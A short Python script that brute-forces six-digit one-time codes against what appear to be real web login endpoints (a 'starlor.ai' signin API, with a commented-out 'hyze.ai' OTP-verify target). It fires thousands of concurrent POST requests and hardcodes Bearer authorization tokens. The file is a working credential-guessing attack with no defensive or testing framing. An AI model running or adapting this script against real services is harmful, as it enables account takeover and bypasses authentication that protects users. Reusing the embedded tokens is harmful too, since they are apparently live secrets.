import requests
import time
from concurrent.futures import ThreadPoolExecutor, as_completed

#python3 -m venv venv
#source venv/bin/activate


# API_URL = 'https://api.hyze.ai/api/auth/verify_otp?=null'
# AUTH_TOKEN = 'Bearer U2FsdGVkX1/ser1YscYgcKrgjSHqxiXD7iRi6ZdJ7a6qWlV8y6UrrqbB51mBkKHX81V1I2orhpOkB12jAg5wV21G+sBxJdDPpAXzpDfmogjmbf+k2/VN0X9qNCBXd0BRIywIpuwXRYaI2WnWXu/l5v2vamKfF5FB4HQEFtOGMc+mjIf0Kt4DHIHJnlmzIycfoQE1R7D0FA/aC93SfQbUM27pfDOSXQHBykE5X7uFLKE5M8kuxEE7W+OpMzkvHbP2sWb52pWJIUodrTr3GU6CzLsSwm9xsSonTzMI0RtoVRfCS+pYrFLxldRNPAJ6tmtk0icmeN8eFqDLTpqW6Q9nkd4+L6HgyAXVRjLr9Az0Jua4HnKxzhdnv3usukBLq5KznbpT5SK0eLz8z7DH2+pm2w=='

# HEADERS = {
#     'Authorization': AUTH_TOKEN,
#     'Content-Type': 'application/json'
# }

# DATA_TEMPLATE = {
#     "email": "test123@gmail.com",
#     "phone": "6546546546",
#     "countryPhoneCode": "+91",
#     "enteredOTPMail": "",
#     "sendTo": 1,
#     "enteredOTP": ""
# }

API_URL = 'https://demoapi.starlor.ai/api/auth/signin?'
AUTH_TOKEN = 'Bearer U2FsdGVkX18K4zHfs+YdQVEdk6dYLebj38dWrfu4Tfth4znHpD3FFHx5aZPnxbUi7KSwmO+r591yD063vOdiuvwG20HsWeOGDrqEdHMfXnjSYAxePGN02oG3qhDezUEelaAIaOKQfMMNLbeemeE6bLu8W576uUO0R0GE9WgWOu+VQtULfqZ3MC8S5pjbTON8fzYkX4pMuicwu8ZTkU+KA2O9qTQK2/5MbkV7Po/okQvPyEPXPd3VJqhax4N3JVlG6OfX4ijHAz+sR4jDSurUGQCAsysEuA3eqowB17P7aBYN0rKTHDRV3Q9XjZ0e1EAABS7cc5MGaggmpHS3bXoov868fMEoSK2XAWclEM0WDoQKhA9AGqPAKjUE92bKh3Vh23GQW8p79S27AWvdDVJF7Q=='

HEADERS = {
    'Authorization': AUTH_TOKEN,
    'Content-Type': 'application/json'
}

DATA_TEMPLATE = {
    "email":"test@gmail.com",
    "loginBy":1,
    "password": ""
}


def send_request(otp: int):
    otp_str = f"{otp:06d}"
    data = DATA_TEMPLATE.copy()
    data["password"] = otp_str

    try:
        response = requests.post(API_URL, headers=HEADERS, json=data)
        return f"OTP: {otp_str} => Status: {response.status_code}, Response: {response.text[:100]}"
    except Exception as e:
        return f"OTP: {otp_str} => Error: {str(e)}"

def brute_force_concurrent(start=100000, end=100010, max_workers=10):
    with ThreadPoolExecutor(max_workers=max_workers) as executor:
        futures = [executor.submit(send_request, otp) for otp in range(start, end)]
        for future in as_completed(futures):
            print(future.result())

if __name__ == "__main__":
    brute_force_concurrent(start=120000, end=123460, max_workers=100)  # Sends 10 requests concurrently
